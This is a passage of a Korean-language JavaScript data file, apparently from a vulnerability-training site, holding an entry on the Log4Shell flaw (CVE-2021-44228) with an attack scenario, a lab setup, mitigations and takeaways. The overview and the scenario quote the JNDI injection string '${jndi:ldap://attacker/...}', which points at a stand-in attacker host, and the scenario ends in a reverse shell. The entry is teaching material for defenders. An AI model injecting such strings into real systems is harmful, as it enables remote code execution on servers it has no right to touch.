...
• 모니터링 강화: 비정상적인 프로세스 실행 탐지`,
  ...
  {
    id: "CVE-2021-44228",
    title: "Apache Log4j2 원격 코드 실행 취약점 (Log4Shell)",
    cvssScore: 10.0,
    severity: "Critical",
    summary:
      "Apache Log4j2의 JNDI Lookup 기능을 악용하여 원격 코드 실행이 가능한 치명적 취약점",
    tags: ["RCE", "Log4j", "Java", "Zero-Day", "Supply Chain"],
    ...
    target: [
      ...
      "Spring Boot, Elasticsearch, Minecraft 등 Log4j2 의존 서비스",
    ],
    attackComplexity: "Low",
    privilegesRequired: "None",

    overview: `• Log4j2는 Java 생태계에서 널리 사용되는 로깅 라이브러리
    • JNDI Lookup 기능이 외부 LDAP/RMI 서버를 신뢰하여 임의 객체 로딩을 허용
    • 공격자는 \${jndi:ldap://attacker/exploit} 문자열을 로그에 주입해 서버에서 악성 코드를 실행
    • 공급망 전반에 광범위한 영향, 2021년 12월 전 세계적으로 대규모 긴급 패치 진행`,

    whyDangerous: `• CVSS 10.0 최고 위험도, 인증 필요 없음
    • 스캐닝 및 자동화 툴로 대규모 공격 가능
    • 수많은 상용/오픈소스 제품이 Log4j2에 의존, 패치 추적 난이도 높음
    • 초기 침투 후 랜섬웨어, 크립토마이너 설치 등 연계 공격으로 이어질 수 있음`,

    attackScenario: `1. 공격자가 취약한 웹 애플리케이션에 특수 문자열(\${jndi:ldap://attacker/payload}) 입력

2. 애플리케이션이 해당 문자열을 로그로 기록하면서 Log4j2 Lookup이 트리거됨

3. Log4j2가 공격자 제어 LDAP 서버에 연결하여 악성 클래스 로드

4. JVM 상에서 임의 코드 실행 → 리버스 쉘 획득 및 추가 공격 수행`,

    labEnvironment: {
      victim: {
        description: "Ubuntu 20.04 + Apache Log4j 2.14.1",
        ip: "10.50.10.20",
      },
      attacker: {
        description: "Kali Linux (LDAP/RMI 서버 구축)",
        ip: "10.50.10.30",
      },
    },
    prerequisites: [
      "Java 11 이상",
      "LDAP/RMI 서버 구성 경험",
      "Burp Suite 또는 curl 활용 능력",
      "log4j-core 2.14.1 설치된 샘플 애플리케이션",
    ],

    mitigation: `• Log4j 2.17.1 이상으로 업데이트 (JNDI default disable)
• JndiLookup 클래스를 클래스패스에서 제거
• 환경 변수 LOG4J_FORMAT_MSG_NO_LOOKUPS=true 설정
• WAF에서 \${jndi: 문자열 탐지 및 차단
• 공급망 시스템의 의존성 버전 점검 및 SBOM 관리`,

    keyTakeaways: [
      "로깅 라이브러리와 같은 공통 컴포넌트의 위험성 이해",
      "SBOM 기반 의존성 관리와 패치 추적의 중요성",
      "JNDI와 같은 동적 로딩 기능의 보안 통제 필요",
      "대응 플레이북과 모니터링 체계의 선제적 구축",
    ],
    ...
    references: [
      ...
      "https://research.nccgroup.com/2021/12/13/understanding-the-log4j-logging-library-vulnerability/",
    ],
  },
];
